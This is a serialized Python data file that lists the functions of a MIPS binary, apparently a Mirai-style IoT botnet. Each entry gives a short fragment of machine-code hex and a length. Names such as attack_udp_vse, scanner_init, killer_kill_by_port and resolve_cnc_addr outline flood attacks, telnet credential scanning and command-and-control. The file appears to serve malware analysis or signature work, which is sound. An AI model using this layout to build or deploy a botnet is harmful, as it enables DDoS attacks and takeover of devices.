(lp0
(S'_init'
p1
S'3c00279c460c99e027bd00afbf00040000003c00279c45e8'
p2
L140L
tp3
a(S'_ftext'
p4
S'3c00279c4580e027bd00afb11cb01891800000000000'
p5
L188L
tp6
a(S'frame_dummy'
p7
S'3c00279c44c499e027bd00afbc8080'
p8
L128L
tp9
a(S'__start'
p10
S'0300040000003c00279c44349fe000f821a50027a60001f803ff8f81a200'
p11
L100L
tp12
a(S'attack_app_http'
p13
S'3c00279c43d099e027bd5218b01080afa55224c0afa7522ca35228a0522800004020'
p14
L19320L
tp15
a(S'attack_init'
p16
S'3c00279cf85803'
p17
L364L
tp18
a(S'attack_kill_all'
p19
S'3c00279cf603'
p20
L212L
tp21
a(S'attack_parse'
p22
S'3c00279cf603ffafbf00afbc00a50000afa000002c00400100'
p23
L1468L
tp24
a(S'attack_start'
p25
S'3c00279c'
p26
L560L
tp27
a(S'attack_get_opt_str'
p28
S'27bd18afa500c0afa700a300afa000'
p29
L204L
tp30
a(S'attack_get_opt_int'
p31
S'3c00279ced6003ffafbf000000c0afa700a30093a200002160300038'
p32
L184L
tp33
a(S'attack_get_opt_ip'
p34
S'3c00279ceca899e027bd00afbc18afa500c0afa700a30093a200002160300038'
p35
L180L
tp36
a(S'add_attack'
p37
S'3c00279ceb03'
p38
L276L
tp39
a(S'free_opts'
p40
S'3c00279ceabd00afbc00afa500a200100000afa0000000'
p41
L244L
tp42
a(S'attack_gre_ip'
p43
S'3c00279ce921bd0000bc18afa50010afa700a20000004020240099'
p44
L3188L
tp45
a(S'attack_gre_eth'
p46
S'3c00279cdd99e027bd00bc18afa500a700a2000021'
p47
L3584L
tp48
a(S'attack_tcp_syn'
p49
S'3c00279ccf7899e027bd0000bc18afa50010afa70000a20000004020240099'
p50
L3468L
tp51
a(S'attack_tcp_ack'
p52
S'3c00279cc199e027bd0000bc18afa50010afa700a20000004020240099'
p53
L3304L
tp54
a(S'attack_tcp_stomp'
p55
S'3c00279cb503'
p56
L4096L
tp57
a(S'attack_udp_generic'
p58
S'3c00279ca50499e027bd0000bc18afa50010afa70000a20000004020240099'
p59
L2352L
tp60
a(S'attack_udp_vse'
p61
S'3c00279c9bd499e027bd0000bc18afa50010afa70000a20000004020240099'
p62
L2212L
tp63
a(S'attack_udp_dns'
p64
S'3c00279c933099e027bd00bc18afa500a700a2000021'
p65
L2820L
tp66
a(S'attack_udp_plain'
p67
S'3c00279c8899e027bd00b154afb050afbc18afa50010afa70000a20000004020240099'
p68
L1480L
tp69
a(S'get_dns_resolver'
p70
S'3c00279c'
p71
L1056L
tp72
a(S'checksum_generic'
p73
S'27bd00afa500a0000000'
p74
L252L
tp75
a(S'checksum_tcpudp'
p76
S'3c0003ffafbf00afa400afa500c0afa70000a200afa20000008c0c0000a2008c100000a00000afa2000000'
p77
L556L
tp78
a(S'killer_init'
p79
S'3c0003ef18b0e0bc010020'
p80
L2508L
tp81
a(S'killer_kill'
p82
S'3c0003ffafbf008f008c00000040202400'
p83
L84L
tp84
a(S'killer_kill_by_port'
p85
S'3c0003ddbf2200222410002100216030'
p86
L3220L
tp87
a(S'has_exe_access'
p88
S'3c0003efb8afbc00a200'
p89
L644L
tp90
a(S'memory_scan_match'
p91
S'3c0003efa0afbc10a0100021000020090000a20002ff00000000cd0000009982000020090000040d000003f8090000040e'
p92
L928L
tp93
a(S'mem_exists'
p94
S'27bd00afa500a600afa700a000a300002a40000000afa00000000000a2000021000062210000'
p95
L248L
tp96
a(S'main'
p97
S'3c0003f920b0d8a406e0a506e4a006e40000000021000020090000a220'
p98
L4608L
tp99
a(S'anti_gdb_entry'
p100
S'3c0003008f800024fb800800'
p101
L44L
tp102
a(S'resolve_cnc_addr'
p103
S'3c0003'
p104
L376L
tp105
a(S'establish_connection'
p106
S'3c0003ffafbf00afbc0024000030'
p107
L336L
tp108
a(S'teardown_connection'
p109
S'3c0003ffafbf008f008c00'
p110
L144L
tp111
a(S'ensure_single_instance'
p112
S'3c0003'
p113
L860L
tp114
a(S'unlock_tbl_if_nodebug'
p115
S'3c0003ffafbc0000008cc0c0c0c028a400afa2b9100000a00002afa3'
p116
L844L
tp117
a(S'rand_init'
p118
S'3c0003ffafbf00afbc20'
p119
L232L
tp120
a(S'rand_next'
p121
S'3c0003ff8f008ca0afa2000000001a'
p122
L276L
tp123
a(S'rand_str'
p124
S'3c0003ffafbf00afbc00afa50000410000'
p125
L336L
tp126
a(S'rand_alphastr'
p127
S'3c0003ffafbc00a500800042b9216020002100002009000000580000'
p128
L464L
tp129
a(S'resolv_domain_to_hostname'
p130
S'3c0003ffafbf00afa400afa500a40099'
p131
L344L
tp132
a(S'resolv_skip_name'
p133
S'27bd00afa500a600afa0002400ac6200002f0000'
p134
L308L
tp135
a(S'resolv_lookup'
p136
S'3c0003eee8afb010a41124002400'
p137
L2520L
tp138
a(S'resolv_entries_free'
p139
S'3c0003ffafbf00afa400'
p140
L148L
tp141
a(S'recv_strip_null'
p142
S'3c0003'
p143
L232L
tp144
a(S'scanner_init'
p145
S'3c0003f820b0d899'
p146
L11108L
tp147
a(S'scanner_kill'
p148
S'3c0003ffafbf008f008c00000040202400'
p149
L84L
tp150
a(S'setup_connection'
p151
S'3c0003ffafbf00afbc00afa000a000a2008c0402ff620b00000000000021000020090000040230'
p152
L492L
tp153
a(S'get_random_ip'
p154
S'3c0003'
p155
L784L
tp156
a(S'consume_iacs'
p157
S'3c0003ffafbf00afa400afa00000002400a2000000'
p158
L928L
tp159
a(S'consume_any_prompt'
p160
S'27bd0024'
p161
L320L
tp162
a(S'consume_user_prompt'
p163
S'3c0003ffafbf00afa40024'
p164
L568L
tp165
a(S'consume_pass_prompt'
p166
S'3c0003ffafbf00afa40024'
p167
L428L
tp168
a(S'consume_resp_prompt'
p169
S'3c0003ffafbf00afa4002400'
p170
L452L
tp171
a(S'add_auth_entry'
p172
S'3c0003'
p173
L632L
tp174
a(S'random_auth_entry'
p175
S'3c0003ffafbf00'
p176
L336L
tp177
a(S'report_working'
p178
S'3c0003ffafbf00afbc00a000a2'
p179
L1008L
tp180
a(S'deobf'
p181
S'3c0003'
p182
L540L
tp183
a(S'can_consume'
p184
S'27bd00afa500a600'
p185
L104L
tp186
a(S'table_init'
p187
S'3c0003ffafbf0024008f0024bc1e8f0024680900000404'
p188
L2240L
tp189
a(S'table_unlock_val'
p190
S'3c0003'
p191
L116L
tp192
a(S'table_lock_val'
p193
S'3c0003'
p194
L116L
tp195
a(S'table_retrieve_val'
p196
S'3c0003ffafa400afa500a2000010002100006221a20010090000000000002100000000008c00bd000000'
p197
L128L
tp198
a(S'add_entry'
p199
S'3c0003'
p200
L184L
tp201
a(S'toggle_obf'
p202
S'3c0003'
p203
L532L
tp204
a(S'util_strlen'
p205
S'27bd00afa000'
p206
L100L
tp207
a(S'util_strncmp'
p208
S'3c0003ffafbf00afa400afa500a600'
p209
L304L
tp210
a(S'util_strcmp'
p211
S'3c0003ffafbf00afa400afa500a400'
p212
L272L
tp213
a(S'util_strcpy'
p214
S'3c0003'
p215
L124L
tp216
a(S'util_memcpy'
p217
S'27bd00afa500a600'
p218
L148L
tp219
a(S'util_zero'
p220
S'27bd00afa500a200afa2000000'
p221
L104L
tp222
a(S'util_atoi'
p223
S'3c0003'
p224
L952L
tp225
a(S'util_itoa'
p226
S'3c0003ffafbc00a50000a200140000000074000000004000000000afa200a3001400'
p227
L544L
tp228
a(S'util_memsearch'
p229
S'27bd00afa500a600afa700a000a300002a400024'
p230
L272L
tp231
a(S'util_stristr'
p232
S'3c0003ffafbf00afa400a50000a200afa20099'
p233
L508L
tp234
a(S'util_local_addr'
p235
S'3c0003ffafbf002400afa28103f80900004000240024000030'
p236
L320L
tp237
a(S'util_fdgets'
p238
S'3c0003ffafbf00afa400afa500a600afa000'
p239
L304L
tp240
a(S'util_isupper'
p241
S'27bd10a3a2002841140000008300420040002400afa2000000afa00027bd000000'
p242
L88L
tp243
a(S'util_isalpha'
p244
S'27bd10a3a200284114000000830042004000000083004200400000008300420040002400afa2000000afa00027bd000000'
p245
L128L
tp246
a(S'util_isspace'
p247
S'27bd10a3a300100d830962090000020a6205830a002400afa2000000afa00027bd000000'
p248
L112L
tp249
a(S'util_isdigit'
p250
S'27bd10a3a20028300000008300420010052400afa2000000afa00027bd000000'
p251
L88L
tp252
a(S'fcntl'
p253
S'3c0003'
p254
L136L
tp255
a(S'fcntl64'
p256
S'3c0003'
p257
L104L
tp258
a(S'chdir'
p259
S'3c0003ffafbf00afbcac009981002120090000500024'
p260
L88L
tp261
a(S'close'
p262
S'3c0003ffafbf00afbc'
p263
L84L
tp264
a(S'fork'
p265
S'3c0003ffafbf00afbca200009981002120090000500024'
p266
L84L
tp267
a(S'getpid'
p268
S'3c0003ffafbf00afbcb4000c9981002120090000500024'
p269
L84L
tp270
a(S'getppid'
p271
S'3c0003ffafbf00afbce0000c9981002120090000500024'
p272
L84L
tp273
a(S'ioctl'
p274
S'3c0003'
p275
L104L
tp276
a(S'kill'
p277
S'3c0003ffafbf00afbc'
p278
L88L
tp279
a(S'open'
p280
S'3c0003'
p281
L124L
tp282
a(S'creat'
p283
S'3c000380a0002403'
p284
L28L
tp285
a(S'prctl'
p286
S'3c0003'
p287
L120L
tp288
a(S'read'
p289
S'3c0003ffafbf00afbca3000c9981002120090000500024'
p290
L84L
tp291
a(S'readlink'
p292
S'3c0003ffafbf00afbcf5000c9981002120090000500024'
p293
L84L
tp294
a(S'select'
p295
S'3c0003'
p296
L120L
tp297
a(S'setsid'
p298
S'3c0003ffafbf00afbce2000c9981002120090000500024'
p299
L84L
tp300
a(S'sigprocmask'
p301
S'3c0003ffafbf00afbc'
p302
L148L
tp303
a(S'time'
p304
S'3c0003ffafbf00afbcad000c9981002120090000500024'
p305
L84L
tp306
a(S'unlink'
p307
S'3c0003ffafbf00afbcaa00009981002120090000500024'
p308
L84L
tp309
a(S'write'
p310
S'3c0003ffafbf00afbca4009981002120090000500024'
p311
L84L
tp312
a(S'closedir'
p313
S'3c0003ffafbf00b230b028808e00240027b318'
p314
L292L
tp315
a(S'opendir'
p316
S'3c0003ffbf00afb0b0bc8005f8090004000021004e009021402003f809a500'
p317
L408L
tp318
a(S'readdir'
p319
S'3c0003ffafbf00b02899818f3000f809a400'
p320
L256L
tp321
a(S'__errno_location'
p322
S'3c000380e00800'
p323
L24L
tp324
a(S'clock'
p325
S'3c0003ffafbf00'
p326
L108L
tp327
a(S'memcpy'
p328
S'280015800003050011008828a800000011000038003801308c00aa008c008c008c002400ac88e089e48ae8ac'
p329
L308L
tp330
a(S'memset'
p331
S'280015801000002800402308030003c885008821c806000038003801302400ac85f814'
p332
L144L
tp333
a(S'memmove'
p334
S'3c0003ffafbf00afbc10002b800018'
p335
L816L
tp336
a(S'ntohl'
p337
S'0300'
p338
L8L
tp339
a(S'ntohs'
p340
S'0300'
p341
L8L
tp342
a(S'htonl'
p343
S'0300'
p344
L8L
tp345
a(S'htons'
p346
S'0300'
p347
L8L
tp348
a(S'inet_addr'
p349
S'3c0003'
p350
L72L
tp351
a(S'accept'
p352
S'3c0003ffafbf00afbc10000c9981002120090000500024'
p353
L84L
tp354
a(S'bind'
p355
S'3c0003ffafbf00afbc10000c9981002120090000500024'
p356
L84L
tp357
a(S'connect'
p358
S'3c0003ffafbf00afbc10000c9981002120090000500024'
p359
L84L
tp360
a(S'getsockname'
p361
S'3c0003ffafbf00afbc10009981002120090000500024'
p362
L84L
tp363
a(S'getsockopt'
p364
S'3c0003'
p365
L120L
tp366
a(S'listen'
p367
S'3c0003ffafbf00afbc10000c9981002120090000500024'
p368
L84L
tp369
a(S'recv'
p370
S'3c0003ffafbf00afbc10000c9981002120090000500024'
p371
L84L
tp372
a(S'recvfrom'
p373
S'3c0003'
p374
L128L
tp375
a(S'send'
p376
S'3c0003ffafbf00afbc10000c9981002120090000500024'
p377
L84L
tp378
a(S'sendto'
p379
S'3c0003'
p380
L128L
tp381
a(S'setsockopt'
p382
S'3c0003'
p383
L120L
tp384
a(S'socket'
p385
S'3c0003ffafbf00afbc10000c9981002120090000500024'
p386
L84L
tp387
a(S'raise'
p388
S'3c0003ffafbf00afbc8000002009800228'
p389
L76L
tp390
a(S'sigaddset'
p391
S'3c0003ffafbf00'
p392
L104L
tp393
a(S'sigemptyset'
p394
S'3c0003ffafbf00'
p395
L60L
tp396
a(S'signal'
p397
S'3c0003feafbf01afbc'
p398
L252L
tp399
a(S'__sigismember'
p400
S'24'
p401
L40L
tp402
a(S'__sigaddset'
p403
S'24'
p404
L44L
tp405
a(S'__sigdelset'
p406
S'24'
p407
L48L
tp408
a(S'malloc'
p409
S'3c0003ffafbf00b020802c'
p410
L492L
tp411
a(S'calloc'
p412
S'3c0003'
p413
L180L
tp414
a(S'free'
p415
S'3c0003'
p416
L396L
tp417
a(S'realloc'
p418
S'3c0003ffafbf00afb324b220b018a098210000200900000000000514002400'
p419
L472L
tp420
a(S'__heap_alloc'
p421
S'8c'
p422
L188L
tp423
a(S'__heap_alloc_at'
p424
S'8c0024008c000000102400a82b000000150000'
p425
L184L
tp426
a(S'__heap_link_free_area'
p427
S'aca700c0aca6001000acc5048500e0020000000000'
p428
L44L
tp429
a(S'__heap_link_free_area_after'
p430
S'100000001000acc5048500e0'
p431
L28L
tp432
a(S'__heap_free'
p433
S'3c0003'
p434
L364L
tp435
a(S'atol'
p436
S'3c0003800021200800'
p437
L28L
tp438
a(S'strtol'
p439
S'3c00038103002400'
p440
L28L
tp441
a(S'_stdlib_strto_l'
p442
S'3c0003ffafbf00afb52cb428b220b018'
p443
L592L
tp444
a(S'exit'
p445
S'3c0003ffafbf00b02899818f0000f80900210000840900000000000000130003f8092021000000212009000000'
p446
L240L
tp447
a(S'sleep'
p448
S'3c0003'
p449
L564L
tp450
a(S'__uClibc_fini'
p451
S'3c0003ffafbf00afbc80800000230006008000002009000010ff10801824'
p452
L196L
tp453
a(S'__pthread_return_0'
p454
S'03000010'
p455
L8L
tp456
a(S'_pthread_cleanup_push_defer'
p457
S'03000000'
p458
L8L
tp459
a(S'__check_one_fd'
p460
S'3c0003'
p461
L136L
tp462
a(S'__uClibc_init'
p463
S'3c0003ffafbf008f008c3400000002018143008f'
p464
L140L
tp465
a(S'__uClibc_main'
p466
S'3c0003ffbf00b39cafb298afb194afb090afbc10'
p467
L872L
tp468
a(S'sigaction'
p469
S'3c0003ffafb260afb15cafb058afbc80c0'
p470
L232L
tp471
a(S'__syscall_rt_sigaction'
p472
S'3c0003ffafbf00afbc10000c9981002120090000500024'
p473
L84L
tp474
a(S'_exit'
p475
S'3c0003'
p476
L80L
tp477
a(S'fstat'
p478
S'3c0003ffbf00bc0000282410000c99810021200900005000100024'
p479
L140L
tp480
a(S'__getdents'
p481
S'3c0003'
p482
L200L
tp483
a(S'__getdents64'
p484
S'3c0003'
p485
L452L
tp486
a(S'getegid'
p487
S'3c0003ffafbf00afbcd2000c9981002120090000500024'
p488
L88L
tp489
a(S'geteuid'
p490
S'3c0003ffafbf00afbcd1000c9981002120090000500024'
p491
L88L
tp492
a(S'getgid'
p493
S'3c0003ffafbf00afbccf00009981002120090000500024'
p494
L84L
tp495
a(S'getuid'
p496
S'3c0003ffafbf00afbc'
p497
L84L
tp498
a(S'lseek64'
p499
S'3c0003ffafbe21b020c027bd308f00c7e0a210000cbd81100000212009000004ff000300000080100000c38f00c203e828b020e008'
p500
L168L
tp501
a(S'nanosleep'
p502
S'3c0003ffafbf00afbc10000c9981002120090000500024'
p503
L84L
tp504
a(S'sbrk'
p505
S'3c0003'
p506
L144L
tp507
a(S'times'
p508
S'3c0003ffafbf00afbccb00009981002120090000500024'
p509
L84L
tp510
a(S'__xstat64_conv'
p511
S'3c0003'
p512
L288L
tp513
a(S'__xstat_conv'
p514
S'3c0003'
p515
L276L
tp516
a(S'inet_aton'
p517
S'3c0003000058210a010029008000024000210030084000004021000524ff29011024840108c01043100018690046383008ff29044000140010000012100084016220400000000012002529050000140000000300240024000300acab0003000010'
p518
L244L
tp519
a(S'abort'
p520
S'3c0003'
p521
L428L
tp522
a(S'_dl_aux_init'
p523
S'3c000300'
p524
L44L
tp525
a(S'brk'
p526
S'3c0003ffafbf00'
p527
L112L
tp528
a(S'__do_global_ctors_aux'
p529
S'3c0003'
p530
L108L
tp531
a(S'_fini'
p532
S'3c0003ffafbc00bc0000003c000380000039202009000000000000e008'
p533
L92L
tp534
a.